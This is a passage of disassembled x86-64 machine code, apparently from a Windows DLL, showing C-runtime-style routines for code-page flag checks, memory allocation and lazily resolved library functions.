   1800083f5:	74 e4                	je     0x1800083db
   1800083f7:	83 e8 01             	sub    $0x1,%eax
   1800083fa:	74 df                	je     0x1800083db
   1800083fc:	83 e8 01             	sub    $0x1,%eax
   1800083ff:	74 da                	je     0x1800083db
   180008401:	83 e8 01             	sub    $0x1,%eax
   180008404:	74 d5                	je     0x1800083db
   180008406:	83 e8 01             	sub    $0x1,%eax
   180008409:	74 d0                	je     0x1800083db
   18000840b:	2d 35 1f 00 00       	sub    $0x1f35,%eax
   180008410:	74 c9                	je     0x1800083db
   180008412:	83 f8 01             	cmp    $0x1,%eax
   180008415:	75 c6                	jne    0x1800083dd
   180008417:	83 e2 08             	and    $0x8,%edx
   18000841a:	eb c1                	jmp    0x1800083dd
   18000841c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008421:	57                   	push   %rdi
   180008422:	8d 81 18 02 ff ff    	lea    -0xfde8(%rcx),%eax
   180008428:	45 8b d9             	mov    %r9d,%r11d
   18000842b:	83 f8 01             	cmp    $0x1,%eax
   18000842e:	49 8b d8             	mov    %r8,%rbx
   180008431:	b8 ac de 00 00       	mov    $0xdeac,%eax
   180008436:	41 0f 96 c2          	setbe  %r10b
   18000843a:	33 ff                	xor    %edi,%edi
   18000843c:	3b c8                	cmp    %eax,%ecx
   18000843e:	77 41                	ja     0x180008481
   180008440:	74 78                	je     0x1800084ba
   180008442:	b8 33 c4 00 00       	mov    $0xc433,%eax
   180008447:	3b c8                	cmp    %eax,%ecx
   180008449:	77 1f                	ja     0x18000846a
   18000844b:	74 6d                	je     0x1800084ba
   18000844d:	8b c1                	mov    %ecx,%eax
   18000844f:	83 e8 2a             	sub    $0x2a,%eax
   180008452:	74 66                	je     0x1800084ba
   180008454:	2d 02 c4 00 00       	sub    $0xc402,%eax
   180008459:	74 5f                	je     0x1800084ba
   18000845b:	83 e8 01             	sub    $0x1,%eax
   18000845e:	74 5a                	je     0x1800084ba
   180008460:	83 e8 01             	sub    $0x1,%eax
   180008463:	74 55                	je     0x1800084ba
   180008465:	83 f8 03             	cmp    $0x3,%eax
   180008468:	eb 48                	jmp    0x1800084b2
   18000846a:	8b c1                	mov    %ecx,%eax
   18000846c:	2d 35 c4 00 00       	sub    $0xc435,%eax
   180008471:	74 47                	je     0x1800084ba
   180008473:	2d 63 12 00 00       	sub    $0x1263,%eax
   180008478:	74 40                	je     0x1800084ba
   18000847a:	2d 12 08 00 00       	sub    $0x812,%eax
   18000847f:	eb 2c                	jmp    0x1800084ad
   180008481:	8b c1                	mov    %ecx,%eax
   180008483:	2d ad de 00 00       	sub    $0xdead,%eax
   180008488:	74 30                	je     0x1800084ba
   18000848a:	83 e8 01             	sub    $0x1,%eax
   18000848d:	74 2b                	je     0x1800084ba
   18000848f:	83 e8 01             	sub    $0x1,%eax
   180008492:	74 26                	je     0x1800084ba
   180008494:	83 e8 01             	sub    $0x1,%eax
   180008497:	74 21                	je     0x1800084ba
   180008499:	83 e8 01             	sub    $0x1,%eax
   18000849c:	74 1c                	je     0x1800084ba
   18000849e:	83 e8 01             	sub    $0x1,%eax
   1800084a1:	74 17                	je     0x1800084ba
   1800084a3:	83 e8 01             	sub    $0x1,%eax
   1800084a6:	74 12                	je     0x1800084ba
   1800084a8:	2d 35 1f 00 00       	sub    $0x1f35,%eax
   1800084ad:	74 0b                	je     0x1800084ba
   1800084af:	83 f8 01             	cmp    $0x1,%eax
   1800084b2:	74 06                	je     0x1800084ba
   1800084b4:	0f ba f2 07          	btr    $0x7,%edx
   1800084b8:	eb 02                	jmp    0x1800084bc
   1800084ba:	8b d7                	mov    %edi,%edx
   1800084bc:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1800084c1:	45 84 d2             	test   %r10b,%r10b
   1800084c4:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   1800084c9:	4c 8b c0             	mov    %rax,%r8
   1800084cc:	4c 0f 45 c7          	cmovne %rdi,%r8
   1800084d0:	4c 0f 45 cf          	cmovne %rdi,%r9
   1800084d4:	74 07                	je     0x1800084dd
   1800084d6:	48 85 c0             	test   %rax,%rax
   1800084d9:	74 02                	je     0x1800084dd
   1800084db:	89 38                	mov    %edi,(%rax)
   1800084dd:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   1800084e2:	4c 8b c3             	mov    %rbx,%r8
   1800084e5:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   1800084ea:	45 8b cb             	mov    %r11d,%r9d
   1800084ed:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   1800084f2:	5f                   	pop    %rdi
   1800084f3:	48 ff 25 a6 6c 00 00 	rex.W jmp *0x6ca6(%rip)        # 0x18000f1a0
   1800084fa:	cc                   	int3
   1800084fb:	cc                   	int3
   1800084fc:	48 8b c4             	mov    %rsp,%rax
   1800084ff:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180008503:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180008507:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000850b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000850f:	41 56                	push   %r14
   180008511:	48 83 ec 40          	sub    $0x40,%rsp
   180008515:	ff 15 8d 6c 00 00    	call   *0x6c8d(%rip)        # 0x18000f1a8
   18000851b:	33 f6                	xor    %esi,%esi
   18000851d:	48 8b d8             	mov    %rax,%rbx
   180008520:	48 85 c0             	test   %rax,%rax
   180008523:	75 07                	jne    0x18000852c
   180008525:	33 c0                	xor    %eax,%eax
   180008527:	e9 c3 00 00 00       	jmp    0x1800085ef
   18000852c:	48 8b eb             	mov    %rbx,%rbp
   18000852f:	66 39 30             	cmp    %si,(%rax)
   180008532:	74 1d                	je     0x180008551
   180008534:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180008538:	48 ff c0             	inc    %rax
   18000853b:	66 39 74 45 00       	cmp    %si,0x0(%rbp,%rax,2)
   180008540:	75 f6                	jne    0x180008538
   180008542:	48 8d 6c 45 00       	lea    0x0(%rbp,%rax,2),%rbp
   180008547:	48 83 c5 02          	add    $0x2,%rbp
   18000854b:	66 39 75 00          	cmp    %si,0x0(%rbp)
   18000854f:	75 e3                	jne    0x180008534
   180008551:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   180008556:	48 2b eb             	sub    %rbx,%rbp
   180008559:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   18000855e:	48 83 c5 02          	add    $0x2,%rbp
   180008562:	48 d1 fd             	sar    $1,%rbp
   180008565:	4c 8b c3             	mov    %rbx,%r8
   180008568:	44 8b cd             	mov    %ebp,%r9d
   18000856b:	89 74 24 28          	mov    %esi,0x28(%rsp)
   18000856f:	33 d2                	xor    %edx,%edx
   180008571:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180008576:	33 c9                	xor    %ecx,%ecx
   180008578:	e8 9f fe ff ff       	call   0x18000841c
   18000857d:	4c 63 f0             	movslq %eax,%r14
   180008580:	49 8b ce             	mov    %r14,%rcx
   180008583:	85 c0                	test   %eax,%eax
   180008585:	75 0b                	jne    0x180008592
   180008587:	48 8b cb             	mov    %rbx,%rcx
   18000858a:	ff 15 20 6c 00 00    	call   *0x6c20(%rip)        # 0x18000f1b0
   180008590:	eb 93                	jmp    0x180008525
   180008592:	e8 59 12 00 00       	call   0x1800097f0
   180008597:	48 8b f8             	mov    %rax,%rdi
   18000859a:	48 85 c0             	test   %rax,%rax
   18000859d:	75 09                	jne    0x1800085a8
   18000859f:	33 c9                	xor    %ecx,%ecx
   1800085a1:	e8 ca e4 ff ff       	call   0x180006a70
   1800085a6:	eb df                	jmp    0x180008587
   1800085a8:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   1800085ad:	44 8b cd             	mov    %ebp,%r9d
   1800085b0:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1800085b5:	4c 8b c3             	mov    %rbx,%r8
   1800085b8:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1800085bd:	33 d2                	xor    %edx,%edx
   1800085bf:	33 c9                	xor    %ecx,%ecx
   1800085c1:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800085c6:	e8 51 fe ff ff       	call   0x18000841c
   1800085cb:	85 c0                	test   %eax,%eax
   1800085cd:	75 0a                	jne    0x1800085d9
   1800085cf:	48 8b cf             	mov    %rdi,%rcx
   1800085d2:	e8 99 e4 ff ff       	call   0x180006a70
   1800085d7:	eb 0a                	jmp    0x1800085e3
   1800085d9:	33 c9                	xor    %ecx,%ecx
   1800085db:	e8 90 e4 ff ff       	call   0x180006a70
   1800085e0:	48 8b f7             	mov    %rdi,%rsi
   1800085e3:	48 8b cb             	mov    %rbx,%rcx
   1800085e6:	ff 15 c4 6b 00 00    	call   *0x6bc4(%rip)        # 0x18000f1b0
   1800085ec:	48 8b c6             	mov    %rsi,%rax
   1800085ef:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800085f4:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1800085f9:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1800085fe:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   180008603:	48 83 c4 40          	add    $0x40,%rsp
   180008607:	41 5e                	pop    %r14
   180008609:	c3                   	ret
   18000860a:	cc                   	int3
   18000860b:	cc                   	int3
   18000860c:	cc                   	int3
   18000860d:	cc                   	int3
   18000860e:	cc                   	int3
   18000860f:	cc                   	int3
   180008610:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008615:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000861a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000861f:	57                   	push   %rdi
   180008620:	48 83 ec 20          	sub    $0x20,%rsp
   180008624:	49 8b e8             	mov    %r8,%rbp
   180008627:	48 8b da             	mov    %rdx,%rbx
   18000862a:	48 8b f1             	mov    %rcx,%rsi
   18000862d:	48 85 d2             	test   %rdx,%rdx
   180008630:	74 1d                	je     0x18000864f
   180008632:	33 d2                	xor    %edx,%edx
   180008634:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   180008638:	48 f7 f3             	div    %rbx
   18000863b:	49 3b c0             	cmp    %r8,%rax
   18000863e:	73 0f                	jae    0x18000864f
   180008640:	e8 af da ff ff       	call   0x1800060f4
   180008645:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   18000864b:	33 c0                	xor    %eax,%eax
   18000864d:	eb 41                	jmp    0x180008690
   18000864f:	48 85 f6             	test   %rsi,%rsi
   180008652:	74 0a                	je     0x18000865e
   180008654:	e8 17 2e 00 00       	call   0x18000b470
   180008659:	48 8b f8             	mov    %rax,%rdi
   18000865c:	eb 02                	jmp    0x180008660
   18000865e:	33 ff                	xor    %edi,%edi
   180008660:	48 0f af dd          	imul   %rbp,%rbx
   180008664:	48 8b ce             	mov    %rsi,%rcx
   180008667:	48 8b d3             	mov    %rbx,%rdx
   18000866a:	e8 51 2e 00 00       	call   0x18000b4c0
   18000866f:	48 8b f0             	mov    %rax,%rsi
   180008672:	48 85 c0             	test   %rax,%rax
   180008675:	74 16                	je     0x18000868d
   180008677:	48 3b fb             	cmp    %rbx,%rdi
   18000867a:	73 11                	jae    0x18000868d
   18000867c:	48 2b df             	sub    %rdi,%rbx
   18000867f:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   180008683:	4c 8b c3             	mov    %rbx,%r8
   180008686:	33 d2                	xor    %edx,%edx
   180008688:	e8 23 53 00 00       	call   0x18000d9b0
   18000868d:	48 8b c6             	mov    %rsi,%rax
   180008690:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008695:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000869a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000869f:	48 83 c4 20          	add    $0x20,%rsp
   1800086a3:	5f                   	pop    %rdi
   1800086a4:	c3                   	ret
   1800086a5:	cc                   	int3
   1800086a6:	cc                   	int3
   1800086a7:	cc                   	int3
   1800086a8:	cc                   	int3
   1800086a9:	cc                   	int3
   1800086aa:	cc                   	int3
   1800086ab:	cc                   	int3
   1800086ac:	cc                   	int3
   1800086ad:	cc                   	int3
   1800086ae:	cc                   	int3
   1800086af:	cc                   	int3
   1800086b0:	e9 5b ff ff ff       	jmp    0x180008610
   1800086b5:	cc                   	int3
   1800086b6:	cc                   	int3
   1800086b7:	cc                   	int3
   1800086b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800086bd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800086c2:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800086c7:	57                   	push   %rdi
   1800086c8:	41 54                	push   %r12
   1800086ca:	41 55                	push   %r13
   1800086cc:	41 56                	push   %r14
   1800086ce:	41 57                	push   %r15
   1800086d0:	48 83 ec 20          	sub    $0x20,%rsp
   1800086d4:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1800086d8:	44 8b e1             	mov    %ecx,%r12d
   1800086db:	4d 8b f1             	mov    %r9,%r14
   1800086de:	49 8b f0             	mov    %r8,%rsi
   1800086e1:	4c 8b fa             	mov    %rdx,%r15
   1800086e4:	4d 3b c1             	cmp    %r9,%r8
   1800086e7:	0f 84 bb 00 00 00    	je     0x1800087a8
   1800086ed:	4c 8d 2d 0c 79 ff ff 	lea    -0x86f4(%rip),%r13        # 0x180000000
   1800086f4:	8b 3e                	mov    (%rsi),%edi
   1800086f6:	49 8b 9c fd 10 b0 01 	mov    0x1b010(%r13,%rdi,8),%rbx
   1800086fd:	00 
   1800086fe:	90                   	nop
   1800086ff:	48 85 db             	test   %rbx,%rbx
   180008702:	74 0e                	je     0x180008712
   180008704:	48 3b d8             	cmp    %rax,%rbx
   180008707:	0f 85 43 01 00 00    	jne    0x180008850
   18000870d:	e9 89 00 00 00       	jmp    0x18000879b
   180008712:	49 8b ac fd 00 0d 01 	mov    0x10d00(%r13,%rdi,8),%rbp
   180008719:	00 
   18000871a:	33 d2                	xor    %edx,%edx
   18000871c:	48 8b cd             	mov    %rbp,%rcx
   18000871f:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   180008725:	ff 15 95 6a 00 00    	call   *0x6a95(%rip)        # 0x18000f1c0
   18000872b:	48 8b d8             	mov    %rax,%rbx
   18000872e:	48 85 c0             	test   %rax,%rax
   180008731:	0f 85 00 01 00 00    	jne    0x180008837
   180008737:	ff 15 33 69 00 00    	call   *0x6933(%rip)        # 0x18000f070
   18000873d:	83 f8 57             	cmp    $0x57,%eax
   180008740:	75 49                	jne    0x18000878b
   180008742:	8d 58 b0             	lea    -0x50(%rax),%ebx
   180008745:	48 8b cd             	mov    %rbp,%rcx
   180008748:	44 8b c3             	mov    %ebx,%r8d
   18000874b:	48 8d 15 e6 8b 00 00 	lea    0x8be6(%rip),%rdx        # 0x180011338
   180008752:	e8 59 1d 00 00       	call   0x18000a4b0
   180008757:	85 c0                	test   %eax,%eax
   180008759:	74 30                	je     0x18000878b
   18000875b:	44 8b c3             	mov    %ebx,%r8d
   18000875e:	48 8d 15 e3 8b 00 00 	lea    0x8be3(%rip),%rdx        # 0x180011348
   180008765:	48 8b cd             	mov    %rbp,%rcx
   180008768:	e8 43 1d 00 00       	call   0x18000a4b0
   18000876d:	85 c0                	test   %eax,%eax
   18000876f:	74 1a                	je     0x18000878b
   180008771:	45 33 c0             	xor    %r8d,%r8d
   180008774:	33 d2                	xor    %edx,%edx
   180008776:	48 8b cd             	mov    %rbp,%rcx
   180008779:	ff 15 41 6a 00 00    	call   *0x6a41(%rip)        # 0x18000f1c0
   18000877f:	48 8b d8             	mov    %rax,%rbx
   180008782:	48 85 c0             	test   %rax,%rax
   180008785:	0f 85 ac 00 00 00    	jne    0x180008837
   18000878b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000878f:	49 87 84 fd 10 b0 01 	xchg   %rax,0x1b010(%r13,%rdi,8)
   180008796:	00 
   180008797:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000879b:	48 83 c6 04          	add    $0x4,%rsi
   18000879f:	49 3b f6             	cmp    %r14,%rsi
   1800087a2:	0f 85 4c ff ff ff    	jne    0x1800086f4
   1800087a8:	33 db                	xor    %ebx,%ebx
   1800087aa:	bf 0e 00 00 00       	mov    $0xe,%edi
   1800087af:	8b cf                	mov    %edi,%ecx
   1800087b1:	e8 62 e1 ff ff       	call   0x180006918
   1800087b6:	83 64 24 60 00       	andl   $0x0,0x60(%rsp)
   1800087bb:	48 8d 35 3e 58 01 00 	lea    0x1583e(%rip),%rsi        # 0x18001e000
   1800087c2:	bd 00 01 00 00       	mov    $0x100,%ebp
   1800087c7:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   1800087cc:	8b d5                	mov    %ebp,%edx
   1800087ce:	44 8d 47 f6          	lea    -0xa(%rdi),%r8d
   1800087d2:	48 8b ce             	mov    %rsi,%rcx
   1800087d5:	ff 15 dd 69 00 00    	call   *0x69dd(%rip)        # 0x18000f1b8
   1800087db:	85 c0                	test   %eax,%eax
   1800087dd:	0f 84 81 00 00 00    	je     0x180008864
   1800087e3:	48 85 db             	test   %rbx,%rbx
   1800087e6:	48 8b c3             	mov    %rbx,%rax
   1800087e9:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1800087f0:	48 0f 44 c1          	cmove  %rcx,%rax
   1800087f4:	4a 87 04 e6          	xchg   %rax,(%rsi,%r12,8)
   1800087f8:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   1800087fd:	8b d5                	mov    %ebp,%edx
   1800087ff:	44 8d 47 f4          	lea    -0xc(%rdi),%r8d
   180008803:	48 8b ce             	mov    %rsi,%rcx
   180008806:	ff 15 ac 69 00 00    	call   *0x69ac(%rip)        # 0x18000f1b8
   18000880c:	85 c0                	test   %eax,%eax
   18000880e:	74 54                	je     0x180008864
   180008810:	8b cf                	mov    %edi,%ecx
   180008812:	e8 55 e1 ff ff       	call   0x18000696c
   180008817:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   18000881c:	48 8b c3             	mov    %rbx,%rax
   18000881f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180008824:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   180008829:	48 83 c4 20          	add    $0x20,%rsp
   18000882d:	41 5f                	pop    %r15
   18000882f:	41 5e                	pop    %r14
   180008831:	41 5d                	pop    %r13
   180008833:	41 5c                	pop    %r12
   180008835:	5f                   	pop    %rdi
   180008836:	c3                   	ret
   180008837:	48 8b c3             	mov    %rbx,%rax
   18000883a:	49 87 84 fd 10 b0 01 	xchg   %rax,0x1b010(%r13,%rdi,8)
   180008841:	00 
   180008842:	48 85 c0             	test   %rax,%rax
   180008845:	74 09                	je     0x180008850
   180008847:	48 8b cb             	mov    %rbx,%rcx
   18000884a:	ff 15 a8 68 00 00    	call   *0x68a8(%rip)        # 0x18000f0f8
   180008850:	49 8b d7             	mov    %r15,%rdx
   180008853:	48 8b cb             	mov    %rbx,%rcx
   180008856:	ff 15 ac 68 00 00    	call   *0x68ac(%rip)        # 0x18000f108
   18000885c:	48 8b d8             	mov    %rax,%rbx
   18000885f:	e9 46 ff ff ff       	jmp    0x1800087aa
   180008864:	e8 07 d2 ff ff       	call   0x180005a70
   180008869:	cc                   	int3
   18000886a:	cc                   	int3
   18000886b:	cc                   	int3
   18000886c:	40 53                	rex push %rbx
   18000886e:	48 83 ec 20          	sub    $0x20,%rsp
   180008872:	48 8b 05 57 58 01 00 	mov    0x15857(%rip),%rax        # 0x18001e0d0
   180008879:	48 8b d9             	mov    %rcx,%rbx
   18000887c:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180008880:	74 3b                	je     0x1800088bd
   180008882:	48 85 c0             	test   %rax,%rax
   180008885:	75 22                	jne    0x1800088a9
   180008887:	4c 8d 0d 32 8b 00 00 	lea    0x8b32(%rip),%r9        # 0x1800113c0
   18000888e:	4c 8d 05 27 8b 00 00 	lea    0x8b27(%rip),%r8        # 0x1800113bc
   180008895:	48 8d 15 24 8b 00 00 	lea    0x8b24(%rip),%rdx        # 0x1800113c0
   18000889c:	8d 48 1a             	lea    0x1a(%rax),%ecx
   18000889f:	e8 14 fe ff ff       	call   0x1800086b8
   1800088a4:	48 85 c0             	test   %rax,%rax
   1800088a7:	74 14                	je     0x1800088bd
   1800088a9:	48 8b d3             	mov    %rbx,%rdx
   1800088ac:	48 c7 c1 fa ff ff ff 	mov    $0xfffffffffffffffa,%rcx
   1800088b3:	48 83 c4 20          	add    $0x20,%rsp
   1800088b7:	5b                   	pop    %rbx
   1800088b8:	e9 73 49 00 00       	jmp    0x18000d230
   1800088bd:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
   1800088c2:	48 83 c4 20          	add    $0x20,%rsp
   1800088c6:	5b                   	pop    %rbx
   1800088c7:	c3                   	ret
   1800088c8:	48 83 ec 28          	sub    $0x28,%rsp
   1800088cc:	48 8b 05 2d 57 01 00 	mov    0x1572d(%rip),%rax        # 0x18001e000
   1800088d3:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800088d7:	74 2f                	je     0x180008908
   1800088d9:	48 85 c0             	test   %rax,%rax
   1800088dc:	75 21                	jne    0x1800088ff
   1800088de:	4c 8d 0d 77 8a 00 00 	lea    0x8a77(%rip),%r9        # 0x18001135c
   1800088e5:	33 c9                	xor    %ecx,%ecx
   1800088e7:	4c 8d 05 6a 8a 00 00 	lea    0x8a6a(%rip),%r8        # 0x180011358
   1800088ee:	48 8d 15 6b 8a 00 00 	lea    0x8a6b(%rip),%rdx        # 0x180011360
   1800088f5:	e8 be fd ff ff       	call   0x1800086b8
   1800088fa:	48 85 c0             	test   %rax,%rax
   1800088fd:	74 09                	je     0x180008908
   1800088ff:	48 83 c4 28          	add    $0x28,%rsp
   180008903:	e9 28 49 00 00       	jmp    0x18000d230
   180008908:	b8 01 00 00 00       	mov    $0x1,%eax
   18000890d:	48 83 c4 28          	add    $0x28,%rsp
   180008911:	c3                   	ret
   180008912:	cc                   	int3
   180008913:	cc                   	int3
   180008914:	48 ff 25 65 67 00 00 	rex.W jmp *0x6765(%rip)        # 0x18000f080
   18000891b:	cc                   	int3
   18000891c:	48 ff 25 75 67 00 00 	rex.W jmp *0x6775(%rip)        # 0x18000f098
   180008923:	cc                   	int3
   180008924:	48 ff 25 5d 67 00 00 	rex.W jmp *0x675d(%rip)        # 0x18000f088
   18000892b:	cc                   	int3
   18000892c:	48 8b 05 e5 56 01 00 	mov    0x156e5(%rip),%rax        # 0x18001e018
   180008933:	48 ff e0             	rex.W jmp *%rax
   180008936:	cc                   	int3
   180008937:	cc                   	int3
   180008938:	48 ff 25 51 67 00 00 	rex.W jmp *0x6751(%rip)        # 0x18000f090
   18000893f:	cc                   	int3
   180008940:	48 ff 25 69 67 00 00 	rex.W jmp *0x6769(%rip)        # 0x18000f0b0
   180008947:	cc                   	int3
   180008948:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000894d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180008952:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180008957:	57                   	push   %rdi
   180008958:	48 83 ec 50          	sub    $0x50,%rsp
   18000895c:	4c 8b 15 2d 57 01 00 	mov    0x1572d(%rip),%r10        # 0x18001e090
   180008963:	41 8b d9             	mov    %r9d,%ebx
   180008966:	49 8b f8             	mov    %r8,%rdi
   180008969:	8b f2                	mov    %edx,%esi
   18000896b:	48 8b e9             	mov    %rcx,%rbp
   18000896e:	49 83 fa ff          	cmp    $0xffffffffffffffff,%r10
   180008972:	74 7f                	je     0x1800089f3
   180008974:	4d 85 d2             	test   %r10,%r10
   180008977:	75 26                	jne    0x18000899f
   180008979:	4c 8d 0d 10 8a 00 00 	lea    0x8a10(%rip),%r9        # 0x180011390
   180008980:	4c 8d 05 01 8a 00 00 	lea    0x8a01(%rip),%r8        # 0x180011388
   180008987:	48 8d 15 02 8a 00 00 	lea    0x8a02(%rip),%rdx        # 0x180011390
   18000898e:	41 8d 4a 12          	lea    0x12(%r10),%ecx
   180008992:	e8 21 fd ff ff       	call   0x1800086b8
   180008997:	4c 8b d0             	mov    %rax,%r10
   18000899a:	48 85 c0             	test   %rax,%rax
   18000899d:	74 54                	je     0x1800089f3
   18000899f:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
   1800089a6:	00 
   1800089a7:	44 8b cb             	mov    %ebx,%r9d
   1800089aa:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   1800089b1:	4c 8b c7             	mov    %rdi,%r8
   1800089b4:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1800089b9:	8b d6                	mov    %esi,%edx
   1800089bb:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   1800089c2:	00 
   1800089c3:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   1800089c8:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   1800089cf:	00 
   1800089d0:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1800089d5:	48 8b cd             	mov    %rbp,%rcx
   1800089d8:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1800089dc:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   1800089e3:	00 
   1800089e4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800089e9:	49 8b c2             	mov    %r10,%rax
   1800089ec:	e8 3f 48 00 00       	call   0x18000d230
   1800089f1:	eb 32                	jmp    0x180008a25
   1800089f3:	33 d2                	xor    %edx,%edx
   1800089f5:	48 8b cd             	mov    %rbp,%rcx
   1800089f8:	e8 3f 00 00 00       	call   0x180008a3c
   1800089fd:	8b c8                	mov    %eax,%ecx
   1800089ff:	44 8b cb             	mov    %ebx,%r9d
   180008a02:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   180008a09:	4c 8b c7             	mov    %rdi,%r8
   180008a0c:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180008a10:	8b d6                	mov    %esi,%edx
   180008a12:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   180008a19:	00 
   180008a1a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180008a1f:	ff 15 a3 67 00 00    	call   *0x67a3(%rip)        # 0x18000f1c8
   180008a25:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   180008a2a:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   180008a2f:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   180008a34:	48 83 c4 50          	add    $0x50,%rsp
   180008a38:	5f                   	pop    %rdi
   180008a39:	c3                   	ret
   180008a3a:	cc                   	int3
   180008a3b:	cc                   	int3
   180008a3c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008a41:	57                   	push   %rdi
   180008a42:	48 83 ec 20          	sub    $0x20,%rsp
   180008a46:	48 8b 05 53 56 01 00 	mov    0x15653(%rip),%rax        # 0x18001e0a0
   180008a4d:	8b fa                	mov    %edx,%edi
   180008a4f:	48 8b d9             	mov    %rcx,%rbx
   180008a52:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180008a56:	74 33                	je     0x180008a8b
   180008a58:	48 85 c0             	test   %rax,%rax
   180008a5b:	75 22                	jne    0x180008a7f
   180008a5d:	4c 8d 0d 44 89 00 00 	lea    0x8944(%rip),%r9        # 0x1800113a8
   180008a64:	4c 8d 05 35 89 00 00 	lea    0x8935(%rip),%r8        # 0x1800113a0
   180008a6b:	48 8d 15 36 89 00 00 	lea    0x8936(%rip),%rdx        # 0x1800113a8
   180008a72:	8d 48 14             	lea    0x14(%rax),%ecx
   180008a75:	e8 3e fc ff ff       	call   0x1800086b8
   180008a7a:	48 85 c0             	test   %rax,%rax
   180008a7d:	74 0c                	je     0x180008a8b
   180008a7f:	8b d7                	mov    %edi,%edx
   180008a81:	48 8b cb             	mov    %rbx,%rcx
   180008a84:	e8 a7 47 00 00       	call   0x18000d230
   180008a89:	eb 08                	jmp    0x180008a93
   180008a8b:	48 8b cb             	mov    %rbx,%rcx
   180008a8e:	e8 a9 2a 00 00       	call   0x18000b53c
   180008a93:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008a98:	48 83 c4 20          	add    $0x20,%rsp
   180008a9c:	5f                   	pop    %rdi
   180008a9d:	c3                   	ret
   180008a9e:	cc                   	int3
   180008a9f:	cc                   	int3
   180008aa0:	48 83 ec 28          	sub    $0x28,%rsp
   180008aa4:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   180008aa9:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   180008aae:	ba 00 01 00 00       	mov    $0x100,%edx
   180008ab3:	48 8d 0d 46 55 01 00 	lea    0x15546(%rip),%rcx        # 0x18001e000
   180008aba:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180008ac0:	ff 15 f2 66 00 00    	call   *0x66f2(%rip)        # 0x18000f1b8
   180008ac6:	85 c0                	test   %eax,%eax
   180008ac8:	0f 95 c0             	setne  %al
   180008acb:	48 83 c4 28          	add    $0x28,%rsp
   180008acf:	c3                   	ret
   180008ad0:	48 83 ec 28          	sub    $0x28,%rsp
   180008ad4:	48 8b 05 3d 55 01 00 	mov    0x1553d(%rip),%rax        # 0x18001e018
   180008adb:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180008adf:	75 04                	jne    0x180008ae5
   180008ae1:	33 c0                	xor    %eax,%eax
   180008ae3:	eb 22                	jmp    0x180008b07
   180008ae5:	48 85 c0             	test   %rax,%rax
